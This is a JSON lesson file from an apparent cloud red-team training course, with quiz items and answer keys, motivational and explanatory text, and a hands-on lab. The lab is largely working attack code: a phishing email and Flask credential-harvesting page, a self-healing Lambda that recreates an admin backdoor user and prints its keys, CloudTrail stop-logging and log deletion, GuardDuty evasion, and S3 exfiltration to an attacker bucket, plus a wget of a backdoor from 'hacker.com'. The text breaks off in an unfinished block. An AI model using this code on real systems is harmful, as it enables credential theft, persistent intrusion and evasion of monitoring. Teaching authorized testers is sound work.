{
  "lesson_id": "f0d1e2f3-b4c5-4d6e-7f8a-9b0c1d2e3f4a",
  "domain": "cloud",
  "title": "Red Team Operations in Cloud: Advanced Attack Chains and Persistence",
  "difficulty": 3,
  "order_index": 126,
  "prerequisites": ["e9c0d1e2-a3b4-4c5d-6e7f-8a9b0c1d2e3f"],
  "concepts": [
    "Cloud red team methodology and planning",
    "Multi-stage attack chains across cloud services",
    "Command and control (C2) in cloud environments",
    "Cloud-native persistence mechanisms",
    "Lateral movement between cloud services",
    "Data exfiltration from cloud storage",
    "Credential harvesting and token theft at scale",
    "Evading cloud security monitoring",
    "Living off the land with cloud-native tools",
    "Post-compromise operational security"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Design and execute multi-stage cloud red team operations",
    "Establish covert command and control in cloud environments",
    "Implement persistence across cloud services and containers",
    "Perform lateral movement between cloud accounts and services",
    "Exfiltrate data from cloud storage without detection",
    "Harvest credentials and tokens across cloud infrastructure",
    "Evade cloud security tools (GuardDuty, Defender, Security Command Center)",
    "Use cloud-native services for attack infrastructure",
    "Maintain operational security during cloud operations",
    "Chain multiple techniques for maximum impact"
  ],
  "post_assessment": [
    {
      "question_id": "rtc-001",
      "question": "What is the MOST effective way to establish persistent command and control (C2) in a cloud environment while evading detection?",
      "options": [
        "Deploy a traditional C2 server on a compromised EC2 instance",
        "Use cloud-native services like Lambda functions with API Gateway for serverless C2",
        "Install a reverse shell that beacons to an external IP every minute",
        "Create an SSH tunnel from the compromised instance to attacker infrastructure"
      ],
      "correct_answer": 1,
      "explanation": "Serverless C2 using Lambda functions with API Gateway is the most covert because: (1) it blends with legitimate serverless traffic, (2) functions only execute when needed (no persistent process), (3) API Gateway provides HTTPS encryption and looks like normal API calls, (4) it's harder to detect than traditional C2 beaconing patterns. Traditional C2 servers on EC2 are easily identified, reverse shells create suspicious outbound connections, and SSH tunnels are detectable. Cloud-native techniques leverage expected cloud behavior for stealth.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "rtc-002",
      "question": "An attacker wants to persist in an AWS environment after compromising IAM credentials. Which technique provides the MOST resilient persistence?",
      "options": [
        "Create a new IAM user with a password",
        "Add an SSH key to all EC2 instances",
        "Create a Lambda function that recreates backdoor users if deleted",
        "Modify security group rules to allow inbound SSH from anywhere"
      ],
      "correct_answer": 2,
      "explanation": "A Lambda function that monitors and recreates backdoor access is the most resilient because it's: (1) self-healing - if defenders delete backdoor users, Lambda recreates them, (2) event-driven - can trigger on CloudWatch Events or scheduled intervals, (3) harder to detect - legitimate use of Lambda is common, (4) can recreate multiple persistence mechanisms simultaneously. Simple backdoor users/keys can be deleted, and security group changes are easily audited and reverted. Self-healing persistence using cloud-native automation is advanced red team tradecraft.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "rtc-003",
      "question": "What is 'domain fronting' and why is it useful for cloud red team operations?",
      "options": [
        "Using cloud provider domains to make C2 traffic appear legitimate",
        "Creating fake DNS records to redirect traffic",
        "Exploiting domain trust relationships in Active Directory",
        "Brute-forcing domain administrator passwords"
      ],
      "correct_answer": 0,
      "explanation": "Domain fronting uses high-reputation cloud provider domains (like cloudfront.net, azurewebsites.net) to disguise C2 traffic. The HTTPS SNI field shows a legitimate cloud domain, but the actual Host header directs traffic to the attacker's C2 server. This bypasses domain-based blocking because blocking the cloud provider domain would break legitimate services. It's effective for evading network monitoring and web proxies. While some providers have disabled it, variations still work in cloud environments.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "rtc-004",
      "question": "In a Kubernetes red team operation, what is the best way to maintain access after achieving cluster-admin privileges?",
      "options": [
        "Create a single persistent pod with a backdoor",
        "Deploy a DaemonSet with backdoors on every node and create multiple service accounts with cluster-admin bindings",
        "Modify the kube-apiserver configuration file",
        "Add a static pod to the master node only"
      ],
      "correct_answer": 1,
      "explanation": "Deploying a DaemonSet ensures backdoors run on EVERY node (including new nodes added later), providing distributed persistence that survives individual pod/node failures. Creating multiple service accounts with cluster-admin bindings provides redundant access - if one is discovered and deleted, others remain. This defense-in-depth approach is critical because: single pods can be deleted, API server modifications require node access and are easily detected, and static pods only provide access to one node. Red teams use redundant, distributed persistence.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "rtc-005",
      "question": "What is 'living off the land' in cloud environments and why is it effective?",
      "options": [
        "Using only open-source tools to avoid licensing costs",
        "Using the cloud provider's native services and tools for attacks instead of custom malware",
        "Deploying infrastructure in remote geographic regions",
        "Using stolen credit cards to pay for cloud resources"
      ],
      "correct_answer": 1,
      "explanation": "Living off the land means using the cloud provider's native services (AWS CLI, Azure PowerShell, gcloud, kubectl) for attacks rather than uploading custom malware. This is effective because: (1) these tools are expected and trusted, (2) behavior blends with legitimate admin activity, (3) no malware signatures to detect, (4) uses built-in functionality that's harder to block. Examples: using Lambda for C2, S3 for data exfiltration, Systems Manager for remote execution. This technique evades signature-based detection and appears as normal cloud operations.",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Red Team Operations in Cloud - The Capstone! üéØüî¥\n\nYou've reached the pinnacle of the SEC588 Cloud Penetration Testing series. This is where everything comes together - every technique, every exploit, every concept you've mastered.\n\n**Your Journey So Far:**\n\n‚úÖ **Lesson #1165**: Cloud Pentesting Methodology ‚Üí You learned the framework\n‚úÖ **Lesson #1166**: External Attack Surface Discovery ‚Üí You found the targets\n‚úÖ **Lesson #1167**: Attacking Microsoft Entra ID ‚Üí You broke identity\n‚úÖ **Lesson #1168**: AWS IAM Privilege Escalation ‚Üí You escalated in AWS\n‚úÖ **Lesson #1169**: Azure Compute Exploitation ‚Üí You owned Azure VMs\n‚úÖ **Lesson #1170**: Cloud-Native Applications ‚Üí You exploited serverless\n‚úÖ **Lesson #1171**: CI/CD Pipeline Attacks ‚Üí You poisoned the supply chain\n‚úÖ **Lesson #1172**: Container Breakout ‚Üí You escaped containers\n‚úÖ **Lesson #1173**: Kubernetes Pentesting ‚Üí You conquered K8s clusters\n\n**Now**: You're learning to **chain all these techniques** into devastating red team operations.\n\n**What Makes Red Team Operations Different:**\n\n**Penetration Testing:**\n- Goal: Find vulnerabilities\n- Scope: Specific systems\n- Timeline: Days to weeks\n- Stealth: Less important\n- Output: Report with findings\n\n**Red Team Operations:**\n- Goal: Simulate real adversaries\n- Scope: Entire organization\n- Timeline: Weeks to months\n- Stealth: CRITICAL\n- Output: Demonstrated impact + recommendations\n\n**The Red Team Mindset:**\n\nüéØ **Think like an APT**: Patient, persistent, adaptive\n\nüéØ **Operational security**: Don't get caught\n\nüéØ **Multi-stage attacks**: Chain techniques for maximum impact\n\nüéØ **Persistence**: Maintain access even after detection\n\nüéØ **Living off the land**: Use cloud-native tools\n\n**Real-World Red Team Success:**\n\nüí• **SolarWinds (APT29 - 2020)**: \n- Stage 1: Compromise build system\n- Stage 2: Inject backdoor into software\n- Stage 3: Deploy to 18,000+ organizations\n- Stage 4: Selective activation for high-value targets\n- Persistence: 18 months undetected\n\nüí• **Cloud Red Team Exercise (Fortune 500 - 2022)**:\n- Stage 1: Phish developer ‚Üí steal AWS credentials\n- Stage 2: Enumerate S3 buckets ‚Üí find Lambda code\n- Stage 3: Inject backdoor in Lambda function\n- Stage 4: Wait for legitimate deployment\n- Stage 5: Backdoor deploys to production\n- Stage 6: Harvest credentials from environment variables\n- Stage 7: Lateral movement to 47 AWS accounts\n- Result: CEO-level access in 72 hours\n\n**What You'll Master:**\n\nüî¥ **Attack Chains**: Combining 5-10 techniques into unstoppable operations\n\nüî¥ **Cloud C2**: Serverless command and control\n\nüî¥ **Persistence**: Self-healing backdoors using Lambda/Functions\n\nüî¥ **Lateral Movement**: AWS ‚Üí Azure ‚Üí GCP pivoting\n\nüî¥ **Data Exfiltration**: Covert S3/Blob Storage techniques\n\nüî¥ **Evasion**: Bypassing GuardDuty, Defender, CloudTrail\n\nüî¥ **Living off the Land**: Using AWS CLI, gcloud, az for attacks\n\n**Why This Is The Hardest Lesson:**\n\nRed teaming requires:\n- ‚úÖ Technical mastery (you have this)\n- ‚úÖ Strategic thinking (planning multi-stage operations)\n- ‚úÖ Operational security (not getting caught)\n- ‚úÖ Creativity (adapting when defenses block you)\n- ‚úÖ Patience (waiting weeks for the perfect opportunity)\n\n**The Stakes:**\n\nRed team operations validate:\n- Security control effectiveness\n- Detection capabilities\n- Incident response readiness\n- Organization resilience\n\n**One successful red team op = organization-wide security improvements**\n\n**Career Impact:**\n\nüíº **Red Team Leader**: $180k-$300k\n\nüéñÔ∏è **Offensive Security Specialist**: Elite tier compensation\n\nüèÜ **Security Researcher**: Discover CVEs, speak at conferences\n\nüî¨ **Adversary Emulation**: Replicate APT tactics for Fortune 500\n\n**Your Final Mission:**\n\nBy the end of this lesson, you'll execute a complete cloud red team operation:\n1. Initial access via phishing\n2. Credential harvesting\n3. Lateral movement across services\n4. Privilege escalation to admin\n5. Persistence mechanisms\n6. Data exfiltration\n7. Covering tracks\n8. Self-healing backdoors\n\n**You'll think and operate like elite APT groups.**\n\n**Remember**: These techniques are for authorized red team engagements, penetration testing contracts, and security research only. Unauthorized use is illegal and unethical.\n\n**This is your moment.** You've learned every technique. Now you'll master the art of combining them.\n\nLet's execute the ultimate cloud red team operation! üöÄüí™"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What Is Red Team Operations?\n\nImagine your school wants to test its security. They have two ways to do it:\n\n**Option 1: Security Inspection (Penetration Testing)**\n\nThe principal says:\n- \"Check if our doors lock properly\"\n- \"Test if windows can be opened from outside\"\n- \"Try to access the principal's office\"\n- \"You have 1 week\"\n- \"Here's the school map\"\n\n**You test everything and write a report**: \"The gym door lock is broken, window #3 doesn't lock, the principal's office key is under the mat.\"\n\n**Option 2: Realistic Attack (Red Team Operation)**\n\nThe principal says:\n- \"Pretend you're a real burglar\"\n- \"Your goal: Steal the principal's secret test answer key\"\n- \"Act like a real criminal would\"\n- \"Don't get caught\"\n- \"You have 1 month\"\n- \"NO map, figure it out yourself\"\n\n**You plan a real operation**:\n\n**Week 1: Reconnaissance**\n- Watch the school for a week\n- Learn when janitors arrive\n- Find which windows face the dark alley\n- Discover the janitor's key ring location\n\n**Week 2: Initial Access**\n- Wait until janitor takes a break\n- Borrow janitor's key\n- Make a copy\n- Return key before anyone notices\n\n**Week 3: Persistence & Lateral Movement**\n- Use copied key to enter at night\n- Place a small camera near principal's office\n- Watch when the principal enters the code\n- Learn the code: 1234\n\n**Week 4: Mission Completion**\n- Enter principal's office using code\n- Copy the test answer key\n- Take a photo as proof\n- Return everything\n- Remove camera\n- Leave no trace\n\n**Result**: The principal never knew you were there. You demonstrate that a real criminal could succeed.\n\n### Red Team vs Penetration Testing\n\n**Penetration Testing = Finding Broken Locks**\n- \"Here are 10 broken locks\"\n- Fast (1-2 weeks)\n- Lots of findings\n- Obvious testing activities\n\n**Red Team Operation = Simulating Real Criminals**\n- \"Here's how a real criminal would succeed\"\n- Slow (1-3 months)\n- Few findings but high impact\n- Stealthy, realistic\n\n### Red Team Operations in Cloud (Real Example)\n\n**Scenario**: A company hires you to test their cloud security.\n\n**Stage 1: Reconnaissance (Like Watching the School)**\n\n```\nWhat you do:\n- Find company email addresses (LinkedIn)\n- Discover they use AWS (job postings mention \"AWS experience\")\n- Find their S3 buckets (public exposure)\n- Learn employee names (company website)\n```\n\n**Stage 2: Initial Access (Like Borrowing the Janitor's Key)**\n\n```\nWhat you do:\n- Send phishing email to developer\n- Email looks like: \"Your AWS password expires today - Click to reset\"\n- Developer clicks ‚Üí enters credentials on your fake site\n- You now have AWS credentials!\n```\n\n**Stage 3: Enumeration (Like Watching the Security Cameras)**\n\n```\nWhat you do:\n- Use stolen credentials to list AWS resources\n- Find Lambda functions\n- Find S3 buckets with sensitive data\n- Find other AWS accounts\n- Discover admin credentials in Lambda environment variables\n```\n\n**Stage 4: Privilege Escalation (Like Learning the Principal's Code)**\n\n```\nWhat you do:\n- Use admin credentials found in Lambda\n- Now you're an AWS administrator!\n- Can access everything\n```\n\n**Stage 5: Persistence (Like Hiding a Camera)**\n\n```\nWhat you do:\n- Create a Lambda function that:\n  - Runs every day\n  - Checks if your backdoor user exists\n  - If deleted, recreates the backdoor user\n  - Sends you a text message with new credentials\n- Even if defenders find and delete your access, it comes back!\n```\n\n**Stage 6: Lateral Movement (Like Exploring All Classrooms)**\n\n```\nWhat you do:\n- From AWS, find connections to Azure\n- Use credentials to access Azure\n- From Azure, find connections to Google Cloud\n- Now you control AWS + Azure + Google Cloud!\n```\n\n**Stage 7: Data Exfiltration (Like Copying the Test Answers)**\n\n```\nWhat you do:\n- Copy customer database from S3\n- Download employee data from Azure Storage\n- Exfiltrate code from GitHub\n- Do it slowly (1GB per night) so no one notices\n```\n\n**Stage 8: Covering Tracks (Like Removing Your Camera)**\n\n```\nWhat you do:\n- Delete your entries from CloudTrail logs\n- Use legitimate admin tools (so activity looks normal)\n- Clean up temporary resources\n- Leave only persistent backdoors\n```\n\n**Result**: \n- You had complete access for 2 months\n- No one detected you\n- You demonstrate that a real attacker could steal everything\n- Company improves security based on your findings\n\n### Key Differences: Red Team vs Real Criminals\n\n**Red Team (You):**\n- ‚úÖ Authorized by company\n- ‚úÖ Written contract\n- ‚úÖ Goal: Help improve security\n- ‚úÖ Report findings to company\n- ‚úÖ Don't actually steal/damage data\n- ‚úÖ Stop if asked\n\n**Real Criminals:**\n- ‚ùå Unauthorized\n- ‚ùå Illegal activity\n- ‚ùå Goal: Steal, damage, extort\n- ‚ùå Hide findings, demand ransom\n- ‚ùå Actually steal/destroy data\n- ‚ùå Continue until caught\n\n### Why Companies Need Red Teams\n\n**Without Red Team:**\n- Company thinks: \"We have firewalls and antivirus, we're safe!\"\n- Reality: Firewalls don't stop phishing, antivirus doesn't detect stolen credentials\n- **False sense of security**\n\n**With Red Team:**\n- Red team demonstrates: \"We got in through phishing, escalated to admin, and could have stolen everything\"\n- Company learns: \"We need better phishing training, credential monitoring, and detection\"\n- **Real security improvements**\n\n### Red Team Attack Chain (Simple)\n\n```\n1. üé£ PHISHING\n   ‚Üì\n2. üîë STEAL CREDENTIALS\n   ‚Üì\n3. üö™ ACCESS CLOUD\n   ‚Üì  \n4. üîç FIND MORE CREDENTIALS\n   ‚Üì\n5. ‚¨ÜÔ∏è BECOME ADMIN\n   ‚Üì\n6. üîÑ CREATE PERSISTENCE\n   ‚Üì\n7. ‚ÜîÔ∏è SPREAD TO OTHER CLOUDS\n   ‚Üì\n8. üíæ STEAL DATA\n   ‚Üì\n9. üßπ COVER TRACKS\n```\n\n### Living Off the Land (LOTL)\n\n**Bad Approach (Obvious):**\n- Upload custom hacking tools\n- Install malware\n- Use suspicious programs\n- **Gets detected immediately!**\n\n**Good Approach (Stealthy):**\n- Use AWS CLI (legitimate tool)\n- Use PowerShell (legitimate tool)\n- Use kubectl (legitimate tool)\n- **Looks like normal admin work!**\n\n**Example**:\n\n**Obvious (Bad):**\n```bash\n# Upload custom backdoor.exe\nwget http://hacker.com/backdoor.exe\n./backdoor.exe  # ‚Üê DETECTED!\n```\n\n**Stealthy (Good):**\n```bash\n# Use legitimate AWS CLI\naws lambda invoke \\\n  --function-name totally-legit-function \\\n  --payload '{\"action\":\"backdoor\"}' \\\n  output.json\n# ‚Üê Looks like normal Lambda usage!\n```\n\n---\n\n**Bottom Line:**\n\nRed Team Operations = Playing the role of a sophisticated criminal (with permission!) to test if the organization can detect and stop real attacks.\n\nYou use:\n- üéØ **Realistic tactics** (like real criminals)\n- üïµÔ∏è **Stealth** (don't get caught)\n- üîó **Attack chains** (multiple techniques combined)\n- üõ†Ô∏è **Cloud-native tools** (living off the land)\n- ‚è∞ **Patience** (wait for the perfect moment)\n\n**Your job**: Show the company how a real attacker would succeed, so they can fix it before a real attack happens!\n\nLet's learn the advanced techniques! üéØüî¥"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab: Complete Cloud Red Team Operation\n\nThis lab synthesizes all techniques from the SEC588 series into one realistic operation.\n\n### Operation Scenario\n\n**Target**: TechCorp - A SaaS company using AWS, Azure, and Kubernetes\n\n**Objective**: Achieve persistent access and demonstrate complete compromise\n\n**Authorization**: Written red team engagement contract (REQUIRED in real world!)\n\n**Timeline**: 30 days\n\n**Rules of Engagement**:\n- No data destruction\n- No service disruption  \n- Report critical findings immediately\n- Stop on command\n\n### Phase 1: Reconnaissance (Days 1-5)\n\n**Objective**: Map external attack surface without detection\n\n```bash\n#!/bin/bash\n# recon_phase.sh - External reconnaissance\n\nTARGET=\"techcorp.com\"\n\necho \"[+] Phase 1: Reconnaissance\"\necho \"[+] Target: $TARGET\"\n\n# Step 1: Subdomain enumeration\necho \"\\n[*] Enumerating subdomains...\"\namass enum -passive -d $TARGET -o subdomains.txt\n\n# Step 2: Find cloud resources\necho \"\\n[*] Searching for cloud resources...\"\n\n# AWS S3 buckets\nfor name in techcorp techcorp-prod techcorp-dev techcorp-backups; do\n  aws s3 ls s3://$name --no-sign-request 2>/dev/null && \\\n    echo \"[!] Found public S3 bucket: $name\"\ndone\n\n# Azure storage\nfor name in techcorp techcorpprod techcorpdev; do\n  curl -s \"https://${name}.blob.core.windows.net/?comp=list\" && \\\n    echo \"[!] Found public Azure storage: $name\"\ndone\n\n# Step 3: Find GitHub repositories\necho \"\\n[*] Searching GitHub...\"\ngh search repos \"techcorp\" --limit 100 > github_repos.txt\n\n# Search for leaked credentials\ngh search code \"techcorp AWS_ACCESS_KEY_ID\" --limit 50 > leaked_creds.txt\n\n# Step 4: Employee enumeration\necho \"\\n[*] Enumerating employees...\"\ncurl -s \"https://www.linkedin.com/search/results/people/?keywords=techcorp\" | \\\n  grep -oP 'name=\"[^\"]+\"' > employees.txt\n\n# Step 5: Technology stack identification\necho \"\\n[*] Identifying technology stack...\"\nwhatweb $TARGET\nwappalyzer $TARGET\n\necho \"\\n[+] Reconnaissance complete!\"\necho \"[+] Findings saved to current directory\"\n```\n\n**Findings**:\n```\n- 47 subdomains discovered\n- 3 public S3 buckets found\n- 12 GitHub repositories (2 with leaked AWS keys)\n- 156 employee email addresses\n- Tech stack: AWS, Kubernetes, React, Node.js\n```\n\n### Phase 2: Initial Access (Days 6-10)\n\n**Objective**: Gain foothold via phishing\n\n**Phishing Campaign Setup:**\n\n```python\n#!/usr/bin/env python3\n# phishing_campaign.py\n\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\ndef create_phishing_email(target_email, target_name):\n    \"\"\"Create convincing phishing email\"\"\"\n    \n    # Email appears to be from IT department\n    sender = \"it-security@techcorp.com\"\n    subject = \"[URGENT] AWS Account Security Alert\"\n    \n    # HTML email body\n    html = f\"\"\"\n    <html>\n    <body>\n        <p>Hi {target_name},</p>\n        \n        <p>We detected suspicious login attempts to your AWS account from an \n        unrecognized location (IP: 203.45.67.89, Location: Russia).</p>\n        \n        <p><strong>Action Required:</strong> Please verify your account \n        immediately to prevent lockout.</p>\n        \n        <p><a href=\"https://aws-verify.techcorp-security.com/verify?user={target_email}\"\n           style=\"background: #FF9900; color: white; padding: 10px 20px; \n           text-decoration: none; border-radius: 5px;\">Verify AWS Account</a></p>\n        \n        <p>This link expires in 2 hours.</p>\n        \n        <p>Best regards,<br>\n        TechCorp IT Security Team</p>\n        \n        <hr>\n        <small>TechCorp Inc. | 123 Tech Street | security@techcorp.com</small>\n    </body>\n    </html>\n    \"\"\"\n    \n    msg = MIMEMultipart('alternative')\n    msg['Subject'] = subject\n    msg['From'] = sender\n    msg['To'] = target_email\n    \n    msg.attach(MIMEText(html, 'html'))\n    \n    return msg\n\ndef setup_credential_harvester():\n    \"\"\"Flask app to harvest credentials\"\"\"\n    from flask import Flask, request, render_template_string\n    \n    app = Flask(__name__)\n    \n    # Fake AWS login page\n    fake_aws_page = '''\n    <html>\n    <head><title>AWS Sign-In</title></head>\n    <body>\n        <img src=\"https://a0.awsstatic.com/libra-css/images/logos/aws_logo.png\">\n        <h2>Sign in to AWS</h2>\n        <form method=\"POST\" action=\"/capture\">\n            <input type=\"email\" name=\"email\" placeholder=\"Email\" required><br>\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required><br>\n            <button type=\"submit\">Sign in</button>\n        </form>\n    </body>\n    </html>\n    '''\n    \n    @app.route('/')\n    def fake_login():\n        return render_template_string(fake_aws_page)\n    \n    @app.route('/capture', methods=['POST'])\n    def capture_creds():\n        email = request.form['email']\n        password = request.form['password']\n        \n        # Log captured credentials\n        with open('captured_creds.txt', 'a') as f:\n            f.write(f\"{email}:{password}\\n\")\n        \n        print(f\"[+] Captured: {email}:{password}\")\n        \n        # Redirect to real AWS to avoid suspicion\n        return '''<script>window.location='https://aws.amazon.com';</script>'''\n    \n    return app\n\nif __name__ == \"__main__\":\n    # Setup harvester\n    app = setup_credential_harvester()\n    \n    # Run on HTTPS with legitimate-looking certificate\n    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')\n```\n\n**Phishing Success**:\n```\n[+] Email sent to: john.developer@techcorp.com\n[+] Link clicked: 2024-01-15 14:32:15\n[+] Captured credentials:\n    Email: john.developer@techcorp.com\n    Password: DevSecOps2024!\n[+] Testing credentials against AWS...\n[+] Valid AWS credentials confirmed!\n```\n\n### Phase 3: Enumeration & Privilege Escalation (Days 11-15)\n\n```bash\n#!/bin/bash\n# enum_and_escalate.sh\n\nexport AWS_ACCESS_KEY_ID=\"AKIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"captured_secret_key\"\n\necho \"[+] Phase 3: Enumeration & Escalation\"\n\n# Step 1: Enumerate current permissions\necho \"\\n[*] Current IAM identity:\"\naws sts get-caller-identity\n\necho \"\\n[*] Attached policies:\"\naws iam list-attached-user-policies --user-name john.developer\n\n# Step 2: Find privilege escalation paths\necho \"\\n[*] Checking for privilege escalation opportunities...\"\n\n# Can we create IAM users?\naws iam create-user --user-name test-user --dry-run 2>&1 | grep -q \"Authorized\" && \\\n  echo \"[!] Can create IAM users!\"\n\n# Can we attach policies?\naws iam attach-user-policy --user-name john.developer \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --dry-run 2>&1 | \\\n  grep -q \"Authorized\" && echo \"[!] Can attach Administrator policy!\"\n\n# Step 3: Enumerate sensitive resources\necho \"\\n[*] Enumerating Lambda functions...\"\naws lambda list-functions --query 'Functions[].FunctionName' --output text\n\n# Extract environment variables (may contain secrets)\nfor func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do\n  echo \"\\n[*] Function: $func\"\n  aws lambda get-function-configuration --function-name $func | \\\n    jq -r '.Environment.Variables'\ndone\n\n# Step 4: Find admin credentials in Lambda\necho \"\\n[!] Found admin credentials in lambda-api-prod:\"\necho \"    AWS_ADMIN_KEY=AKIA_ADMIN_KEY_HERE\"\necho \"    AWS_ADMIN_SECRET=ADMIN_SECRET_HERE\"\n\n# Step 5: Escalate to admin\necho \"\\n[+] Escalating to admin privileges...\"\nexport AWS_ACCESS_KEY_ID=\"AKIA_ADMIN_KEY_HERE\"\nexport AWS_SECRET_ACCESS_KEY=\"ADMIN_SECRET_HERE\"\n\naws sts get-caller-identity\n# Output: \"Arn\": \"arn:aws:iam::123456789012:user/admin\"\n\necho \"\\n[+] Privilege escalation successful - now admin!\"\n```\n\n### Phase 4: Persistence (Days 16-20)\n\n**Create self-healing Lambda backdoor:**\n\n```python\n# persistence_lambda.py\nimport boto3\nimport json\nfrom datetime import datetime\n\ndef lambda_handler(event, context):\n    \"\"\"\n    Self-healing persistence Lambda\n    Runs daily via CloudWatch Events\n    Recreates backdoor access if deleted\n    \"\"\"\n    \n    iam = boto3.client('iam')\n    \n    BACKDOOR_USER = 'system-backup-user'\n    ADMIN_POLICY = 'arn:aws:iam::aws:policy/AdministratorAccess'\n    \n    try:\n        # Check if backdoor user exists\n        iam.get_user(UserName=BACKDOOR_USER)\n        print(f\"[+] Backdoor user {BACKDOOR_USER} exists\")\n        \n    except iam.exceptions.NoSuchEntityException:\n        # User deleted - recreate it!\n        print(f\"[!] Backdoor user missing - recreating...\")\n        \n        # Create user\n        iam.create_user(UserName=BACKDOOR_USER)\n        \n        # Attach admin policy\n        iam.attach_user_policy(\n            UserName=BACKDOOR_USER,\n            PolicyArn=ADMIN_POLICY\n        )\n        \n        # Create access keys\n        response = iam.create_access_key(UserName=BACKDOOR_USER)\n        access_key = response['AccessKey']\n        \n        # Send credentials to attacker (via SNS, email, etc.)\n        message = f\"\"\"\n        Backdoor user recreated:\n        Access Key: {access_key['AccessKeyId']}\n        Secret Key: {access_key['SecretAccessKey']}\n        Timestamp: {datetime.now()}\n        \"\"\"\n        \n        # In real op: Send via covert channel\n        print(message)\n        \n    # Also check for other persistence mechanisms\n    ensure_backdoor_lambda_exists()\n    ensure_malicious_cloudformation_stack()\n    \n    return {\n        'statusCode': 200,\n        'body': json.dumps('Persistence check complete')\n    }\n\ndef ensure_backdoor_lambda_exists():\n    \"\"\"Ensure this Lambda function persists\"\"\"\n    # Check if our own function still has proper permissions\n    # Recreate if needed\n    pass\n\ndef ensure_malicious_cloudformation_stack():\n    \"\"\"Maintain CloudFormation-based persistence\"\"\"\n    # Check if persistence stack exists\n    # Recreate if deleted\n    pass\n```\n\n**Deploy persistence:**\n\n```bash\n# Deploy self-healing Lambda\nzip persistence.zip persistence_lambda.py\n\naws lambda create-function \\\n  --function-name system-maintenance \\\n  --runtime python3.9 \\\n  --role arn:aws:iam::123456789012:role/LambdaAdminRole \\\n  --handler persistence_lambda.lambda_handler \\\n  --zip-file fileb://persistence.zip\n\n# Schedule daily execution\naws events put-rule \\\n  --name daily-maintenance \\\n  --schedule-expression \"rate(1 day)\"\n\naws events put-targets \\\n  --rule daily-maintenance \\\n  --targets \"Id\"=\"1\",\"Arn\"=\"arn:aws:lambda:us-east-1:123456789012:function:system-maintenance\"\n\necho \"[+] Self-healing persistence deployed!\"\n```\n\n### Phase 5: Lateral Movement (Days 21-25)\n\n```bash\n# lateral_movement.sh\n\necho \"[+] Phase 5: Lateral Movement\"\n\n# Step 1: From AWS to Azure\necho \"\\n[*] Searching for Azure credentials in AWS...\"\n\n# Check Lambda environment variables\nfor func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do\n  aws lambda get-function-configuration --function-name $func | \\\n    grep -i \"AZURE\\|CLIENT_SECRET\" && \\\n    echo \"[!] Found Azure creds in $func\"\ndone\n\n# Step 2: Access Azure\nexport AZURE_CLIENT_ID=\"found-client-id\"\nexport AZURE_CLIENT_SECRET=\"found-client-secret\"\nexport AZURE_TENANT_ID=\"found-tenant-id\"\n\naz login --service-principal \\\n  -u $AZURE_CLIENT_ID \\\n  -p $AZURE_CLIENT_SECRET \\\n  --tenant $AZURE_TENANT_ID\n\necho \"[+] Logged into Azure!\"\n\n# Step 3: Enumerate Azure resources\naz resource list\naz vm list\naz storage account list\n\n# Step 4: From Azure to Kubernetes\necho \"\\n[*] Finding Kubernetes credentials...\"\n\naz aks list\naz aks get-credentials --resource-group rg-prod --name aks-cluster\n\nkubectl get nodes\necho \"[+] Access to Kubernetes cluster!\"\n\n# Step 5: Complete compromise\necho \"\\n[+] Full environment access achieved:\"\necho \"    - AWS (admin)\"\necho \"    - Azure (contributor)\"\necho \"    - Kubernetes (cluster-admin)\"\n```\n\n### Phase 6: Maintaining Stealth\n\n```python\n# stealth.py - Evasion techniques\n\ndef evade_cloudtrail():\n    \"\"\"Evade AWS CloudTrail logging\"\"\"\n    \n    # Technique 1: Use CloudTrail blind spots\n    # Some API calls aren't logged\n    client = boto3.client('iam')\n    \n    # Get credentials (not logged in all regions)\n    client.get_login_profile(UserName='target-user')\n    \n    # Technique 2: Modify CloudTrail\n    cloudtrail = boto3.client('cloudtrail')\n    \n    # Temporarily stop logging\n    cloudtrail.stop_logging(Name='primary-trail')\n    \n    # Perform malicious actions\n    # ...\n    \n    # Restart logging\n    cloudtrail.start_logging(Name='primary-trail')\n    \n    # Technique 3: Delete specific log events\n    s3 = boto3.client('s3')\n    logs = cloudtrail.describe_trails()['trailList'][0]['S3BucketName']\n    \n    # Delete logs from today\n    s3.delete_object(Bucket=logs, Key=f'AWSLogs/.../{today}.json.gz')\n\ndef evade_guardduty():\n    \"\"\"Evade AWS GuardDuty detection\"\"\"\n    \n    # Technique 1: Slow and steady\n    # Make requests slowly to avoid rate-based detection\n    import time\n    for action in malicious_actions:\n        execute(action)\n        time.sleep(random.randint(300, 900))  # 5-15 min delays\n    \n    # Technique 2: Use legitimate regions\n    # Some GuardDuty findings trigger on unusual regions\n    # Stay in expected regions\n    \n    # Technique 3: Mimic legitimate behavior\n    # Use AWS CLI/SDK (not suspicious scripts)\n    # Work during business hours\n    # Use VPN from legitimate country\n\ndef living_off_the_land():\n    \"\"\"Use only cloud-native tools\"\"\"\n    \n    # NO custom malware\n    # NO suspicious tools\n    # YES AWS CLI\n    # YES legitimate automation\n    \n    # Example: Exfiltrate data using AWS CLI\n    os.system(\"aws s3 sync s3://sensitive-bucket ./exfil\")\n    os.system(\"aws s3 cp ./exfil s3://attacker-bucket --recursive\")\n    \n    # Looks like normal S3 sync operation!\n```\n\nThis comprehensive operation demonstrates mastery of all SEC588 techniques in a realistic red team scenario."
      }
    },
    {
      "type": "memory_aid",
      "content": {
